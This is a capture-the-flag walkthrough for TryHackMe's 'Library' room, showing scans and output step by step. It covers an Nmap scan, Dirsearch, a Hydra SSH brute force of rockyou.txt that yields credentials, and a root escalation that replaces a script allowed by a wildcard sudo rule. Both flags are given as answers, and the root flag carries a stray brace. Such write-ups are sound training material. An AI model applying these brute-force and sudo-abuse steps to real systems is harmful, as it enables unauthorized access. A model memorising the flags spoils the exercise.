# Library — TryHackMe Walkthrough

> Boot-to-root machine for FIT and BSides Guatemala CTF. Read user.txt and root.txt.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/484c37bcb5b90fac35d15f0c5ccdaed6.jpeg" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/bsidesgtlibrary">
    <img src="https://img.shields.io/badge/TryHackMe-Library-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20SSH%20Brute%20Force%20%7C%20Python%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Web Poking (robots.txt) |
| 4 | Brute Forcing — SSH |
| 5 | Misconfigured Sudo Binary |
| 6 | Python Scripting for Privilege Escalation |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Identify open ports and web services using Nmap and Dirsearch
- Read `robots.txt` for unintended information disclosure
- Extract a username hint from web page content and brute-force SSH with Hydra
- Enumerate sudo permissions and identify an exploitable rule
- Overwrite a Python script to spawn a root shell via a misconfigured sudo path

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Dirsearch or Gobuster, and Hydra installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Library

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify all open ports and services on the target.

```
kali@kali:~/CTFs/tryhackme/Library$ sudo nmap -A -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:59 CEST
Nmap scan report for Machine_IP
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.05 seconds
```

> **Note:** Only two ports are open — **SSH on 22** and **HTTP on 80**. The web server title "Welcome to Blog - Library Machine" tells us it is a blog. The next step is to enumerate directories and check for any exposed files on the web server.

---

### Step 2 — Web Enumeration with Dirsearch

**Approach:** Use Dirsearch to brute-force directories and common files on the web server.

```
kali@kali:~/CTFs/tryhackme/Library$ sudo /opt/dirsearch/dirsearch.py -u Machine_IP -w /usr/share/dirb/wordlists/common.txt -e html,php

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Target: Machine_IP

[17:00:31] Starting:
[17:00:39] 301 -  315B  - /images  ->  http://Machine_IP/images/
[17:00:39] 200 -    5KB - /index.html
[17:00:42] 200 -   33B  - /robots.txt
[17:00:43] 403 -  301B  - /server-status

Task Completed
```

> **Note:** `robots.txt` is found and returns a `200 OK` — it exists and is readable. Always check `robots.txt` manually; it is designed to tell search engine crawlers which paths to skip, but developers sometimes accidentally put sensitive information inside it.

---

### Step 3 — Reading robots.txt for Clues

**Approach:** Navigate to `http://Machine_IP/robots.txt` and read its contents carefully.

```
User-agent: rockyou
Disallow: /
```

> **Note:** The `User-agent` field is set to **`rockyou`** — this is not a real browser or crawler. It is a direct hint that the `rockyou.txt` wordlist should be used for brute-forcing. The blog page itself also reveals a username: **`meliodas`** (visible in the blog author or post metadata). With a username and a wordlist hint, the next step is to brute-force SSH.

---

### Step 4 — SSH Brute-Force with Hydra

**Approach:** Use Hydra to brute-force SSH login for user `meliodas` using the `rockyou.txt` wordlist — as hinted by `robots.txt`.

```
kali@kali:~/CTFs/tryhackme/Library$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://Machine_IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 17:04:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://Machine_IP:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344223 to do in 1335:36h, 16 active
[22][ssh] host: Machine_IP   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 17:05:43
```

> **Note:** Hydra finds the password **`iloveyou1`** after approximately 90 seconds. This is a very common password found near the top of `rockyou.txt`, which is why the hint pointed to that specific wordlist. The credentials are: **`meliodas:iloveyou1`**.

---

### Step 5 — SSH Login and Reading user.txt

**Approach:** Log in via SSH with the cracked credentials and read the user flag.

```
kali@kali:~/CTFs/tryhackme/Library$ ssh meliodas@Machine_IP
The authenticity of host 'Machine_IP' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
meliodas@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

> **Note:** The home directory contains two files — `user.txt` (the flag) and `bak.py` (a Python backup script). The backup script will become the escalation vector. Always list the home directory immediately after logging in.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`6d488cbb3f111d135722c33cb635f4ec`**

</details>

---

### Step 6 — Enumerating Sudo Permissions

**Approach:** Run `sudo -l` to check what commands `meliodas` can run with elevated privileges. Then inspect the `bak.py` script and its file permissions.

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
```

> **Note:** The sudo rule is: `(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py`. The wildcard `python*` means any Python binary can be used. The rule locks the script path to `/home/meliodas/bak.py` — but `bak.py` is owned by root and written with permissions `-rw-r--r--`, which means `meliodas` cannot edit it. However, `meliodas` **can delete it** (because the parent directory is owned by `meliodas`) and then create a new file with the same name. This is the critical misconfiguration.

---

### Step 7 — Overwriting bak.py and Escalating to Root

**Approach:** Delete the original `bak.py`, write a new one containing a Python reverse shell using `pty.spawn`, and execute it via sudo.

```
meliodas@ubuntu:~$ rm -f bak.py
meliodas@ubuntu:~$ cat > bak.py << EOF
> #!/usr/bin/env python
> import pty
> pty.spawn("/bin/bash")
> EOF
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
e8c8c6c256c35515d1d344ee0488c617
```

> **Note:** The new `bak.py` contains just two lines — it imports Python's `pty` module and uses `pty.spawn("/bin/bash")` to spawn a fully interactive bash shell. Because it is executed with `sudo /usr/bin/python3`, the spawned shell runs as **root**. The `root@ubuntu` prompt confirms full system access. The root flag is found directly in `/root/root.txt`.

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`e8c8c6c256c35515d1d344ee0488c617}`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH (22) and Apache HTTP (80) |
| 2 | Dirsearch on web root | Found `robots.txt` returning a `200 OK` |
| 3 | Read `robots.txt` | Found `User-agent: rockyou` hint — pointing to `rockyou.txt` wordlist |
| 4 | Blog page inspection | Found username `meliodas` in blog content |
| 5 | Hydra SSH brute-force with `rockyou.txt` | Cracked `meliodas:iloveyou1` |
| 6 | SSH login as `meliodas` | Gained shell access, read `user.txt` |
| 7 | `sudo -l` enumeration | Found passwordless sudo rule for `python* /home/meliodas/bak.py` |
| 8 | Inspected `bak.py` permissions | File owned by root but parent directory writable — can delete and recreate |
| 9 | Replaced `bak.py` with `pty.spawn("/bin/bash")` | Ran via `sudo python3` to spawn root shell |
| 10 | Read `root.txt` | Found root flag in `/root/` |
